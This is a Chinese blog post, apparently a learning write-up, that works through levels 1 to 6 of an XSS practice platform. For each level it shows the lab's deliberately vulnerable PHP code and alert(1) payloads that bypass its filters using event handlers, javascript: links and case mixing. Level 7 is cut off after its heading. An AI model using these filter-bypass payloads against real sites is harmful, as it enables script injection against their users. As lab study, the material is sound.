@@ -1,0 +1,1598 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="jax">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="jax">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>XSS平台练习 · jax&#39;s Studio</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >jax&#39;s Studio.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">XSS平台练习</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>jax's Studio.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            XSS平台练习
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "XSS学习">XSS学习</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.6k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/11/20</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p><strong>————————-</strong></p>
+<p><strong>XSS**</strong>挑战之旅**</p>
+<p><strong>————————-</strong></p>
+<p>最近在学习xss，找到了一个xss练习平台，在线地址：<a href="http://test.xss.tv/" target="_blank" rel="noopener">http://test.xss.tv/</a></p>
+<p>实验环境也可以本地搭建，不过需要php+mysql的环境：</p>
+<p>xss通关小游戏：<a href="https://pan.baidu.com/s/1zS2GwTNbMBXEF2yNEBeLgA" target="_blank" rel="noopener">https://pan.baidu.com/s/1zS2GwTNbMBXEF2yNEBeLgA</a>   密码：85g8</p>
+<p>我这里使用本地搭建，方便分析代码，安装好的页面如下：</p>
+<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="img"></p>
+<p><strong>Level 1:</strong></p>
+<p><strong><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg" alt="img"></strong></p>
+<p>分析一下源代码中的判断xss的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = $_GET[&quot;name&quot;];</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>根据代码发现，变量$str从url接受一个get类型的name参数，并且没有对传入的name参数进行任何过滤</p>
+<p>直接echo出来，我们可以直接构造任意可弹窗payload,</p>
+<p>这里使用最基本的：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，也可以使用 &lt;svg/onload=alert(1)&gt; 等…</p>
+<p> <img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg" alt="img"></p>
+<p>成功过关！</p>
+<p><strong>Level 2:</strong></p>
+<p><strong><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg" alt="img"></strong></p>
+<p>从图中可以看出这是一个典型的搜索框xss，</p>
+<p>分析一下源代码中的判断xss的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str.&apos;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析代码，仍然是使用get方法，从url中接受一个keyword参数，不过这里用到一个过滤函数htmlspecialchars()，</p>
+<p>这个函数把预定义的字符转换为 HTML 实体，等于&lt;不能用，这时候一种方法是黑名单绕过，就是不使用被过滤的符号，使用js的事件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload :  &quot; onclick=alert(1)这样需要点击一下输入框&lt;br&gt;</span><br><span class="line"></span><br><span class="line">           &quot; onmouseover=alert(1)&gt;需要鼠标划过输入框&lt;br&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg" alt="img"></p>
+<p>另外一种方法就是在构造payload就要将input的文本框本分提前闭合，不影响我们弹框代码，</p>
+<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg" alt="img"></p>
+<p>我这里使用  <code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p>这样的话 : <code>&lt;input name=&quot;keyword&quot; value=&quot;  &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code></p>
+<p>这样value=”  “，不会检查我们的弹窗代码</p>
+<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg" alt="img"></p>
+<p>成功过关！！！</p>
+<p><strong>Level 3:</strong></p>
+<p><strong><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg" alt="img"></strong></p>
+<p>分析一下源代码中的判断xss的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析代码发现跟上面大同小异，不过过滤更加严格了，特别是value=’”.htmlspecialchars($str).”‘发现</p>
+<p>上题尝试闭合&lt;””&gt;构造<code>&lt;script&gt;</code> 弹窗方法失效了，应为value中的&lt;被转义了，只能利用上题中的js时间</p>
+<p>来构造弹窗，不过这里需要用单引号闭合，构造<code>payload :  &#39; onmouseover=alert(1)//</code></p>
+<p>这样的话： <code>&lt;input name=keyword value=&#39;  &#39; onmouseover=alert(1)// &#39;&gt;</code></p>
+<p> <img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg" alt="img"></p>
+<p>闯关成功！！！</p>
+<p><strong>Level 4:</strong></p>
+<p><strong><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg" alt="img"></strong></p>
+<p>分析一下源代码中的判断xss的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line"></span><br><span class="line">$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line"></span><br><span class="line">$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=level4.php method=GET&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str3.&apos;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们看到，我们传入进去的值又经过了两个函数的参与。<br> 函数说明：<br> Str_replace(“&gt;”, “ “ ,$str)，此函数将变量str中的字符&gt;转换为空，转换时区分大小写。同理将&lt;装换为空，</p>
+<p>然后在经过htmlspecialchars()函数，将一些预定义符号转换为html实体。</p>
+<p>通过这几个函数的过滤转化，我们前三关的payload肯定对不能用的。所以接下来我们需要做的就是，</p>
+<p>在没有符号“&lt;&gt;”的情况下，并且语句不被htmlspecialchars()函数影响的情况下构建payload。</p>
+<p>所以我们在这里可以构造一个输入到文本框后出现相应的事件。我们的payload：<br> “ onfocus=alert(1) autofocus=”</p>
+<p>“ onclick=alert(1) //<br> 这样我们输入的payload没有被函数过滤，并且经过htmlspecailchars()函数转换并不影响最 input文本框。所以输入后文本框内容就变成了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword value=&quot; &quot; onfocus=alert(1) autofocus=&quot; &quot; &gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image022.jpg" alt="img"></p>
+<p>&lt;input name=keyword value=” “ onclick=alert(1) //“&gt;</p>
+<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image024.jpg" alt="img"><br> Onfocus事件：定义的事件将在对象获得焦点时触发，这里指input标签获得焦点。<br> Autofocus属性：input标签的属性，当页面加载input标签，自动获得焦点。<br> 焦点：这里指你的光标的位置，也就是说当你的光标出现在input文本框这里，将进行onfocus事件的发生。</p>
+<p> <strong>Level 5:</strong></p>
+<p><strong><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image026.jpg" alt="img"></strong></p>
+<p>分析一下源代码中的判断xss的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line"></span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line"></span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=level5.php method=GET&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str3.&apos;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析代码发现，str2=strreplace(“&lt;script”,”&lt;script”,str2=strreplace(“&lt;script”,”&lt;script”,str); str3=strreplace(“on”,”on”,str3=strreplace(“on”,”on”,str2); 就直接把</p>
+<script 转换成 <scr_ipt ，on转换成 o_n ，这样就过滤了js事件，str="strtolower(str=strtolower(_GET[" keyword"]);这样" 大小写绕过也失效，不过这次没有过滤尖括号<>，这里使用伪协议来构造payload:
+
+"><iframe src=javascript:alert(1)>
+
+"> <a href="javascript:alert(1)">bmjoker</a>
+
+"> <a href="javascript:%61lert(1)">bmjoker</a> //
+
+这样的话： <input name=keyword value="  "><iframe src=javascript:alert(1)>">
+
+![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image028.jpg)
+
+<input name=keyword value="  "><iframe src=javascript:alert(1)>">
+
+![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image030.jpg)
+
+闯关成功！！！
+
+
+
+ **Level 6:**
+
+![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg)
+
+分析一下源代码中的判断xss的代码：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line"></span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line"></span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line"></span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line"></span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line"></span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=level6.php method=GET&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str6.&apos;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+分析代码，发现同样过滤了很多字符，<script 转换成 <scr_ipt ，on 转换成 o_n ，src 转换成 sr_c ，
+
+data 转换成 da_ta，href 转换成 hr_ef，比起上一关，发现这里没有大小写约束， 我们可以构造payload:
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;Script&gt;alert(1)&lt;/script&gt; //</span><br><span class="line"></span><br><span class="line">&quot;&gt; &lt;img Src=x OnError=alert(1)&gt; //</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;a HrEf=&quot;javascript:alert(1)&quot;&gt;bmjoker&lt;/a&gt;//</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;svg x=&quot; &quot; Onclick=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;ScriPt&gt;alert(1)&lt;sCrIpt&gt;&quot;</span><br><span class="line"></span><br><span class="line">&quot; OncliCk=alert(1) //</span><br></pre></td></tr></table></figure>
+
+![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg)
+
+![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg)
+
+成功过关！！！
+
+
+
+ **Level 7:**
+
+**![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg)**
+
+分析一下源代码中的判断xss的代码：
+
